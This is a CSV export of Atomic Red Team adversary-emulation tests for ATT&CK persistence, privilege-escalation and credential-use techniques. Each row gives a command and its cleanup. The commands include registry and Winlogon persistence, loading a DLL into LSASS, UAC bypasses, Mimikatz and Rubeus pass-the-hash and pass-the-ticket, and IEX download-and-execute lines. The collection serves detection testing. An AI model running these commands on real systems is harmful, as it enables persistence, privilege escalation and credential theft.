"File","AtomicTest","Command","Cleanup"
"C:\AtomicRedTeam\atomics\T1547\T1547.yaml","Add a driver","pnputil.exe /add-driver ""#{driver_inf}""
",
"C:\AtomicRedTeam\atomics\T1547\T1547.yaml","Driver Installation Using pnputil.exe","pnputil.exe -i -a #{driver_path}
",
"C:\AtomicRedTeam\atomics\T1547\T1547.yaml","Leverage Virtual Channels to execute custom DLL during successful RDP session","reg add ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\#{Subkey_Added}"" /v Name /t REG_SZ /d ""#{dll_inf}"" /f
","reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\#{Subkey_Added}"" /f      "
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","Reg Key Run","REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""#{command_to_execute}""
","REG DELETE ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /f >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","Reg Key RunOnce","REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""#{thing_to_execute}""
","REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","PowerShell Registry RunOnce","$RunOnceKey = ""#{reg_key_path}""
set-itemproperty $RunOnceKey ""NextRun"" '#{thing_to_execute} ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'
","Remove-ItemProperty -Path #{reg_key_path} -Name ""NextRun"" -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","SystemBC Malware-as-a-Service Registry","$RunKey = ""#{reg_key_path}""
Set-ItemProperty -Path $RunKey -Name ""socks5_powershell"" -Value ""#{reg_key_value}""
","Remove-ItemProperty -Path #{reg_key_path} -Name ""socks5_powershell"" -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value","New-Item -ItemType Directory -path ""#{new_startup_folder}""
Copy-Item -path ""#{payload}"" -destination ""#{new_startup_folder}""
Set-ItemProperty -Path  ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Common Startup"" -Value ""#{new_startup_folder}""
","Set-ItemProperty -Path  ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Common Startup"" -Value ""%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup""
Remove-Item ""#{new_startup_folder}"" -Recurse -Force
"
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","Change Startup Folder - HKCU Modify User Shell Folders Startup Value","New-Item -ItemType Directory -path ""#{new_startup_folder}""
Copy-Item -path ""#{payload}"" -destination ""#{new_startup_folder}""
Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""#{new_startup_folder}""
","Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup""
Remove-Item ""#{new_startup_folder}"" -Recurse -Force
"
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","HKCU - Policy Settings Explorer Run Key","if (!(Test-Path -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"")){
  New-Item -ItemType Key -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer""
}
if (!(Test-Path -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){
  New-Item -ItemType Key -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
}
Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}"" -Value ""#{payload}""
","Remove-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}"""
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","HKLM - Policy Settings Explorer Run Key","if (!(Test-Path -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){
  New-Item -ItemType Key -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
}
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}"" -Value ""#{payload}""
","Remove-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}"""
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","HKLM - Append Command to Winlogon Userinit KEY Value","$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"");
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit-backup"" -Value ""$oldvalue"";
$newvalue = $oldvalue + "" #{payload}"";
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"" -Value ""$newvalue""
","$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name 'Userinit-backup');
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"" -Value ""$oldvalue"";
Remove-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name 'Userinit-backup'"
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","HKLM - Modify default System Shell - Winlogon Shell KEY Value ","$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell"");
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell-backup"" -Value ""$oldvalue"";
$newvalue = $oldvalue + "", #{payload}"";
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell"" -Value ""$newvalue""
","$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name 'Shell-backup');
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell"" -Value ""$oldvalue"";
Remove-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name 'Shell-backup'"
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","secedit used to create a Run key in the HKLM Hive","secedit /import /db #{secedit_db} /cfg ""#{ini_file}""
secedit /configure /db #{secedit_db}
","REG DELETE ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""calc"" /f >nul 2>&1"
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","Modify BootExecute Value","if (!(Test-Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"")) { reg.exe export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"" /y }
Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"" -Name ""BootExecute"" -Value ""#{registry_value}"" -Type MultiString
","reg.exe import ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg""
Remove-Item -Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"" -Force
"
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","Allowing custom application to execute during new RDP logon session","reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /f /v StartupPrograms /t REG_SZ /d ""#{malicious_app}""
","reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /f /v StartupPrograms /t REG_SZ /d ""rdpclip"""
"C:\AtomicRedTeam\atomics\T1547.001\T1547.001.yaml","Creating Boot Verification Program Key for application execution during successful boot","reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""#{malicious_file}""
","reg delete HKLM\System\CurrentControlSet\Control\BootVerificationProgram /f"
"C:\AtomicRedTeam\atomics\T1547.004\T1547.004.yaml","Winlogon Shell Key Persistence - PowerShell","Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, #{binary_to_execute}"" -Force
","Remove-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" -Name ""Shell"" -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1547.004\T1547.004.yaml","Winlogon Userinit Key Persistence - PowerShell","Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, #{binary_to_execute}"" -Force
","Remove-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" -Name ""Userinit"" -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1547.004\T1547.004.yaml","Winlogon Notify Key Logon Persistence - PowerShell","New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""DllName"" ""#{binary_to_execute}"" -Type ExpandString -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Logon"" ""#{function_to_execute}"" -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Impersonate"" 1 -Type DWord -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Asynchronous"" 0 -Type DWord -Force
","Remove-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1547.004\T1547.004.yaml","Winlogon HKLM Shell Key Persistence - PowerShell","Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, #{binary_to_execute}"" -Force
","Remove-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" -Name ""Shell"" -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1547.004\T1547.004.yaml","Winlogon HKLM Userinit Key Persistence - PowerShell","Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, #{binary_to_execute}"" -Force
","Remove-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" -Name ""Userinit"" -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1547.006\T1547.006.yaml","Linux - Load Kernel Module via insmod","sudo insmod #{module_path}
","sudo rmmod #{module_name}
[ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}
"
"C:\AtomicRedTeam\atomics\T1547.006\T1547.006.yaml","MacOS - Load Kernel Module via kextload and kmutil","set -x
sudo kextload #{module_path}
kextstat 2>/dev/null | grep SoftRAID
sudo kextunload #{module_path}
sudo kmutil load -p #{module_path}
kextstat 2>/dev/null | grep SoftRAID
sudo kmutil unload -p #{module_path}
",
"C:\AtomicRedTeam\atomics\T1547.006\T1547.006.yaml","MacOS - Load Kernel Module via KextManagerLoadKextWithURL()","sudo #{exe_path}
kextstat 2>/dev/null | grep SoftRAID
sudo kextunload /Library/Extensions/SoftRAID.kext
","rm -f #{exe_path}
"
"C:\AtomicRedTeam\atomics\T1547.007\T1547.007.yaml","Copy in loginwindow.plist for Re-Opened Applications","cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
","rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
"
"C:\AtomicRedTeam\atomics\T1547.007\T1547.007.yaml","Re-Opened Applications using LoginHook","sudo defaults write com.apple.loginwindow LoginHook #{script}
","sudo defaults delete com.apple.loginwindow LoginHook
"
"C:\AtomicRedTeam\atomics\T1547.007\T1547.007.yaml","Append to existing loginwindow for Re-Opened Applications","FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
if [ -z ""${FILE}"" ] ; then echo ""No loginwindow plist file found"" && exit 1 ; fi
echo save backup copy to /tmp/
cp ${FILE} /tmp/t1547007_loginwindow-backup.plist
echo before
plutil -p ${FILE}
echo overwriting...
#{exe_path} ${FILE} && echo after && plutil -p ${FILE}
","rm -f #{exe_path}
# revert to backup copy
FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
if [ -z ""${FILE}"" ] ; then
   exit 0
fi
mv /tmp/t1547007_loginwindow-backup.plist ${FILE}
"
"C:\AtomicRedTeam\atomics\T1547.008\T1547.008.yaml","Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt","New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value ""#{dll_path}""
","Remove-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\NTDS"" -Name ""LsaDbExtPt"" -ErrorAction Ignore | Out-Null
"
"C:\AtomicRedTeam\atomics\T1547.009\T1547.009.yaml","Shortcut Modification","echo [InternetShortcut] > #{shortcut_file_path}
echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path}
#{shortcut_file_path}
","del -f #{shortcut_file_path} >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1547.010\T1547.010.yaml","Add Port Monitor persistence in Registry","reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""#{monitor_dll}"" /t REG_SZ /f
","reg delete ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /f >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1547.012\T1547.012.yaml","Print Processors","if( $(get-service -Name spooler).StartType -eq ""Disabled"") {Set-Service -Name ""spooler"" -StartupType Automatic}
net stop spooler
Copy-Item ""$PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll"" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" /v ""Driver"" /d ""AtomicTest.dll"" /t REG_SZ /f
net start spooler
if(#{restart}){
  Restart-Computer
}
","net stop spooler
rm -force C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll -ErrorAction SilentlyContinue
rm -force C:\Users\Public\AtomicTest.txt -ErrorAction SilentlyContinue
remove-item ""HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" -Force -ErrorAction SilentlyContinue
net start spooler
"
"C:\AtomicRedTeam\atomics\T1547.014\T1547.014.yaml","HKLM - Add atomic_test key to launch executable as part of user setup","New-Item ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components"" -Name ""atomic_test"" -Force
Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""(Default)"" ""ART TEST"" -Force
Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""StubPath"" ""#{payload}"" -Force 
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup","Remove-Item ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" -Force -ErrorAction Ignore
Remove-Item ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" -Force -ErrorAction Ignore"
"C:\AtomicRedTeam\atomics\T1547.014\T1547.014.yaml","HKLM - Add malicious StubPath value to existing Active Setup Entry","Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" ""StubPath"" ""#{payload}"" -Force
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup","Remove-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""StubPath"" -Force
Remove-ItemProperty ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Force"
"C:\AtomicRedTeam\atomics\T1547.015\T1547.015.yaml","Persistence by modifying Windows Terminal profile","mv #{settings_json_def} #{settings_json_tmp}
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"" -OutFile ""#{settings_json_def}""
wt.exe
","mv -Force #{settings_json_tmp} #{settings_json_def}
taskkill /F /IM ""#{calculator}"" > $null
"
"C:\AtomicRedTeam\atomics\T1547.015\T1547.015.yaml","Add macOS LoginItem using Applescript","osascript #{scriptfile}
","osascript #{cleanup_script}
"
"C:\AtomicRedTeam\atomics\T1548.001\T1548.001.yaml","Make and modify binary from C source","cp #{payload} /tmp/hello.c
sudo chown root /tmp/hello.c
sudo make /tmp/hello
sudo chown root /tmp/hello
sudo chmod u+s /tmp/hello
/tmp/hello
","sudo rm /tmp/hello
sudo rm /tmp/hello.c
"
"C:\AtomicRedTeam\atomics\T1548.001\T1548.001.yaml","Make and modify binary from C source (freebsd)","cp #{payload} /tmp/hello.c
chown root /tmp/hello.c
make /tmp/hello
chown root /tmp/hello
chmod u+s /tmp/hello
/tmp/hello
","rm /tmp/hello
rm /tmp/hello.c
"
"C:\AtomicRedTeam\atomics\T1548.001\T1548.001.yaml","Set a SetUID flag on file","sudo touch #{file_to_setuid}
sudo chown root #{file_to_setuid}
sudo chmod u+xs #{file_to_setuid}
","sudo rm #{file_to_setuid}
"
"C:\AtomicRedTeam\atomics\T1548.001\T1548.001.yaml","Set a SetUID flag on file (freebsd)","touch #{file_to_setuid}
chown root #{file_to_setuid}
chmod u+xs #{file_to_setuid}
","rm #{file_to_setuid}
"
"C:\AtomicRedTeam\atomics\T1548.001\T1548.001.yaml","Set a SetGID flag on file","sudo touch #{file_to_setuid}
sudo chown root #{file_to_setuid}
sudo chmod g+xs #{file_to_setuid}
","sudo rm #{file_to_setuid}
"
"C:\AtomicRedTeam\atomics\T1548.001\T1548.001.yaml","Set a SetGID flag on file (freebsd)","touch #{file_to_setuid}
chown root #{file_to_setuid}
chmod g+xs #{file_to_setuid}
","rm #{file_to_setuid}
"
"C:\AtomicRedTeam\atomics\T1548.001\T1548.001.yaml","Make and modify capabilities of a binary","cp #{payload} /tmp/cap.c
make /tmp/cap
sudo setcap cap_setuid=ep /tmp/cap
/tmp/cap
","rm /tmp/cap
rm /tmp/cap.c
"
"C:\AtomicRedTeam\atomics\T1548.001\T1548.001.yaml","Provide the SetUID capability to a file","touch #{file_to_setcap}
sudo setcap cap_setuid=ep #{file_to_setcap}
","rm #{file_to_setcap}
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","Bypass UAC using Event Viewer (cmd)","reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""#{executable_binary}"" /f
cmd.exe /c eventvwr.msc
","reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","Bypass UAC using Event Viewer (PowerShell)","New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force
Set-ItemProperty ""HKCU:\software\classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\eventvwr.msc""
","Remove-Item ""HKCU:\software\classes\mscfile"" -force -Recurse -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","Bypass UAC using Fodhelper","reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""#{executable_binary}"" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f
fodhelper.exe
","reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","Bypass UAC using Fodhelper - PowerShell","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\fodhelper.exe""
","Remove-Item ""HKCU:\software\classes\ms-settings"" -force -Recurse -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","Bypass UAC using ComputerDefaults (PowerShell)","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\ComputerDefaults.exe""
","Remove-Item ""HKCU:\software\classes\ms-settings"" -force -Recurse -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","Bypass UAC by Mocking Trusted Directories","mkdir ""\\?\C:\Windows \System32\""
copy ""#{executable_binary}"" ""\\?\C:\Windows \System32\mmc.exe""
mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""
","rd ""\\?\C:\Windows \"" /S /Q >nul 2>nul
del ""c:\testbypass.exe"" >nul 2>nul
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","Bypass UAC using sdclt DelegateExecute","New-Item -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Value '#{command_to_execute}'
New-ItemProperty -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3
","Remove-Item -Path ""HKCU:\Software\Classes\Folder"" -Recurse -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","Bypass UAC using SilentCleanup task","""#{file_path}""
",
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","UACME Bypass Method 23","""#{uacme_exe}""
","powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","UACME Bypass Method 31","""#{uacme_exe}""
","powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","UACME Bypass Method 33","""#{uacme_exe}""
","powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","UACME Bypass Method 34","""#{uacme_exe}""
","powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","UACME Bypass Method 39","""#{uacme_exe}""
","powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","UACME Bypass Method 56","""#{uacme_exe}""
","powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","UACME Bypass Method 59","""#{uacme_exe}""
","powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","UACME Bypass Method 61","""#{uacme_exe}""
","powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1548.002\T1548.002.yaml","UAC Bypass with WSReset Registry Modification","New-Item #{commandpath} -Force | Out-Null
New-ItemProperty -Path #{commandpath} -Name ""DelegateExecute"" -Value """" -Force | Out-Null
Set-ItemProperty -Path #{commandpath} -Name ""(default)"" -Value ""#{commandtorun}"" -Force -ErrorAction SilentlyContinue | Out-Null
$Process = Start-Process -FilePath ""C:\Windows\System32\WSReset.exe"" -WindowStyle Hidden","Remove-Item #{commandpath} -Recurse -Force
"
"C:\AtomicRedTeam\atomics\T1550.002\T1550.002.yaml","Mimikatz Pass the Hash","#{mimikatz_path} ""sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}""
",
"C:\AtomicRedTeam\atomics\T1550.002\T1550.002.yaml","crackmapexec Pass the Hash","#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
",
"C:\AtomicRedTeam\atomics\T1550.002\T1550.002.yaml","Invoke-WMIExec Pass the Hash","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}",
"C:\AtomicRedTeam\atomics\T1550.003\T1550.003.yaml","Mimikatz Kerberos Ticket Attack","""#{mimikatz_exe}"" ""kerberos::ptt #{ticket}""
",
"C:\AtomicRedTeam\atomics\T1550.003\T1550.003.yaml","Rubeus Kerberos Pass The Ticket","& ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -accepteula \\#{target} -w c:\ -c ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi
Set-Location ""PathToAtomicsFolder\..\ExternalPayloads""
Move-Item -Force ""\\#{target}\c$\ticket.kirbi"" ticket.kirbi
Write-Host ""Successfully retrieved TGT from '#{target}', now requesting a TGS from local""
& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi""
& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" purge      
",
